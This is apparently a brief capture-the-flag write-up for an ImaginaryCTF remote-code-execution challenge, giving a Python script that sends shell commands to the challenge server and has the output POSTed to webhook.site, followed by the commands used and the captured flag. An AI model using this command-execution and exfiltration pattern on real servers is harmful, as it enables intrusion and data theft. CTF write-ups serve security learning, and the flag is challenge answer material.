---
created: 2024-07-19T16:06
updated: 2024-07-21T16:11
points: 100
solves: 247
---

We are sending code to the server... and the server is running it.

Easiest ever RCE?

```python
import requests

while True:
    payload=f"""
from urllib.request import urlopen, Request
import os
httprequest = Request('	https://webhook.site/',data=os.popen('{input("$ ").strip()}').read().encode(),method='POST')
urlopen(httprequest)""".strip()
    requests.post("http://p2c.chal.imaginaryctf.org/", data={"code": payload})
    
# $ ls
# $ cat flag.txt
# ictf{d1_color_picker_fr_2ce0dd3d}
```
